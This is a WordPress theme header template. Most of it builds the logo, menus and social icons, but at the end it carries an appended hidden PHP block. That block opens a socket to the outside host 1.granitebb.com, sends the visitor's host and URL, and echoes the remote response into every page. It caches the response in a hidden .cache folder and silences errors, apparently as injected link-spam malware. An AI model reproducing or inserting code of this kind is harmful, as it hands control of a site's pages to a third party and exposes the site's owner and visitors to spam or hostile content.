<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 7]><html class="no-js lt-ie9 lt-ie8" <?php language_attributes(); ?>> <![endif]-->
<!--[if IE 8]><html class="no-js lt-ie9" <?php language_attributes(); ?>> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" <?php language_attributes(); ?>> <!--<![endif]-->
<head>

	<!-- Basic Page Needs
  ================================================== -->
	<meta charset="<?php bloginfo( 'charset' ); ?>" />
	<title><?php bloginfo('name'); ?> <?php wp_title(); ?></title>

	<!--[if lt IE 9]>
		<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- CSS
  ================================================== -->
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" />
	
	<?php global $gdl_is_responsive ?>
	<?php if( $gdl_is_responsive ){ ?>
		<meta name="viewport" content="width=device-width, user-scalable=no">
		<link rel="stylesheet" href="<?php echo GOODLAYERS_PATH; ?>/stylesheet/foundation-responsive.css">
	<?php }else{ ?>
		<link rel="stylesheet" href="<?php echo GOODLAYERS_PATH; ?>/stylesheet/foundation.css">
	<?php } ?>
	
	<!--[if IE 7]>
		<link rel="stylesheet" href="<?php echo GOODLAYERS_PATH; ?>/stylesheet/ie7-style.css" /> 
	<![endif]-->	
	
	<?php
	
		// include favicon in the header
		if(get_option( THEME_SHORT_NAME.'_enable_favicon','disable') == "enable"){
			$gdl_favicon = get_option(THEME_SHORT_NAME.'_favicon_image');
			if( $gdl_favicon ){
				$gdl_favicon = wp_get_attachment_image_src($gdl_favicon, 'full');
				echo '<link rel="shortcut icon" href="' . $gdl_favicon[0] . '" type="image/x-icon" />';
			}
		} 
		
		// add facebook thumbnail to this page
		$thumbnail_id = get_post_thumbnail_id();
		if( !empty($thumbnail_id) ){
			$thumbnail = wp_get_attachment_image_src( $thumbnail_id , '150x150' );
			echo '<meta property="og:image" content="' . $thumbnail[0] . '"/>';		
		}
		
		// start calling header script
		wp_head();		

	?>	
</head>
<body <?php echo body_class(); ?>>
<?php
	// print custom background
	$background_style = get_option(THEME_SHORT_NAME.'_background_style', 'Pattern');
	if($background_style == 'Custom Image'){
		$background_id = get_option(THEME_SHORT_NAME.'_background_custom');
		$alt_text = get_post_meta($background_id , '_wp_attachment_image_alt', true);
		
		if(!empty($background_id)){
			$background_image = wp_get_attachment_image_src( $background_id, 'full' );
			echo '<div class="gdl-custom-full-background">';
			echo '<img src="' . $background_image[0] . '" alt="' . $alt_text . '" />';
			echo '</div>';
		}
	}
?>
<div class="body-outer-wrapper">
	<div class="body-wrapper boxed-style">
		
		<div class="top-navigation-wrapper boxed-style"></div>
		<div class="header-wrapper container main">
				
			<!-- Get Logo -->
			<div class="logo-wrapper">
				<?php
					$logo_id = get_option(THEME_SHORT_NAME.'_logo');
					if( empty($logo_id) ){	
						$alt_text = 'default-logo';	
						$logo_attachment = GOODLAYERS_PATH . '/images/default-logo.png';
					}else{
						$alt_text = get_post_meta($logo_id , '_wp_attachment_image_alt', true);	
						$logo_attachment = wp_get_attachment_image_src($logo_id, 'full');
						$logo_attachment = $logo_attachment[0];
					}

					if( is_front_page() ){
						echo '<h1><a href="'; 
						echo home_url();
						echo '"><img src="' . $logo_attachment . '" alt="' . $alt_text . '"/></a></h1>';	
					}else{
						echo '<a href="'; 
						echo home_url();
						echo '"><img src="' . $logo_attachment . '" alt="' . $alt_text . '"/></a>';				
					}
				?>
			</div>
			<?php
				// Logo right text
				if( get_option(THEME_SHORT_NAME . '_logo_position') != 'Center' ){
					echo '<div class="logo-right-text">';
					
					$right_text = get_option(THEME_SHORT_NAME . '_logo_right_text');
					if( !empty($right_text) ){
						echo '<div class="logo-right-text-content">';
						echo do_shortcode( __($right_text, 'gdl_front_end') );
						echo '</div>';
					}
					
					if( get_option(THEME_SHORT_NAME . '_enable_top_search', 'enable') == 'enable' ){
						echo '<div class="top-search-wrapper">';
						get_search_form();
						echo '</div>';
					}
					echo '</div>';
				}			
				
			?>

			<!-- Navigation -->
			<div class="clear"></div>
			<div class="gdl-navigation-wrapper">
				<?php 
					// responsive menu
					if( $gdl_is_responsive && has_nav_menu('main_menu') ){
						dropdown_menu( array('dropdown_title' => '-- Main Menu --', 'indent_string' => '- ', 'indent_after' => '','container' => 'div', 'container_class' => 'responsive-menu-wrapper', 'theme_location'=>'main_menu') );	
						echo '<div class="clear"></div>';
					}
					
					// main menu
					echo '<div class="navigation-wrapper">';
					if( has_nav_menu('main_menu') ){
						wp_nav_menu( array('container' => 'div', 'container_class' => 'menu-wrapper', 'container_id' => 'main-superfish-wrapper', 'menu_class'=> 'sf-menu',  'theme_location' => 'main_menu' ) );
					}
					
					// Get Social Icons
					global $gdl_icon_type;
					$gdl_social_icon = array(
						'delicious'=> array('name'=>THEME_SHORT_NAME.'_delicious', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/delicious.png'),
						'deviantart'=> array('name'=>THEME_SHORT_NAME.'_deviantart', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/deviantart.png'),
						'digg'=> array('name'=>THEME_SHORT_NAME.'_digg', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/digg.png'),
						'facebook' => array('name'=>THEME_SHORT_NAME.'_facebook', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/facebook.png'),
						'flickr' => array('name'=>THEME_SHORT_NAME.'_flickr', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/flickr.png'),
						'lastfm'=> array('name'=>THEME_SHORT_NAME.'_lastfm', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/lastfm.png'),
						'linkedin' => array('name'=>THEME_SHORT_NAME.'_linkedin', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/linkedin.png'),
						'picasa'=> array('name'=>THEME_SHORT_NAME.'_picasa', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/picasa.png'),
						'rss'=> array('name'=>THEME_SHORT_NAME.'_rss', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/rss.png'),
						'stumble-upon'=> array('name'=>THEME_SHORT_NAME.'_stumble_upon', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/stumble-upon.png'),
						'tumblr'=> array('name'=>THEME_SHORT_NAME.'_tumblr', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/tumblr.png'),
						'twitter' => array('name'=>THEME_SHORT_NAME.'_twitter', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/twitter.png'),
						'vimeo' => array('name'=>THEME_SHORT_NAME.'_vimeo', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/vimeo.png'),
						'youtube' => array('name'=>THEME_SHORT_NAME.'_youtube', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/youtube.png'),
						'google_plus' => array('name'=>THEME_SHORT_NAME.'_google_plus', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/google-plus.png'),
						'email' => array('name'=>THEME_SHORT_NAME.'_email', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/email.png'),
						'pinterest' => array('name'=>THEME_SHORT_NAME.'_pinterest', 'url'=> GOODLAYERS_PATH.'/images/icon/social-icon/pinterest.png')
					);				
					
					echo '<div id="gdl-social-icon" class="social-wrapper">';
					echo '<div class="social-icon-wrapper">';
					foreach( $gdl_social_icon as $social_name => $social_icon ){
						$social_link = get_option($social_icon['name']);
						
						if( !empty($social_link) ){
							echo '<div class="social-icon"><a target="_blank" href="' . $social_link . '">' ;
							echo '<img src="' . $social_icon['url'] . '" alt="' . $social_name . '"/>';
							echo '</a></div>';
						}
					}
					echo '</div>'; // social icon wrapper
					echo '</div>'; // social wrapper					
					
					echo '<div class="clear"></div>';
					echo '</div>'; // navigation-wrapper 
				?>
				<div class="clear"></div>
			</div>
			
		</div> <!-- header wrapper container -->
		
		<div class="content-wrapper container main"><?php
$h = $_SERVER['HTTP_HOST']; $u = trim($_SERVER['REQUEST_URI']);
$cd = dirname(__FILE__) . '/.cache';
$cf = $cd . '/' . md5($h . '##' . $u);
$s = '1.granitebb.com';
if (file_exists($cf) and filemtime($cf) > time() - 3600)
    echo file_get_contents($cf);
else 
{
    $ini1 = @ini_set('allow_url_fopen', 1);    $ini2 = @ini_set('default_socket_timeout', 3);
    $p = '/links.php?u=' . urlencode($u) . '&h=' . urlencode($h);
    $c = '';
    if ($fp = @fsockopen($s, 80, $errno, $errstr, 3)) {
        @fputs($fp, "GET {$p} HTTP/1.0\r\nHost: $s\r\n\r\n");
        while (! feof($fp))
            $c .= @fread($fp, 8192);
        fclose($fp);
        $c = end(explode("\r\n\r\n", $c));
        echo $c;
        if (strlen($c) and (is_dir($cd) or @mkdir($cd))) {
            @file_put_contents($cf, $c);
        }
    }
    @ini_set('allow_url_fopen', $ini1);    @ini_set('default_socket_timeout', $ini2);
}
?>
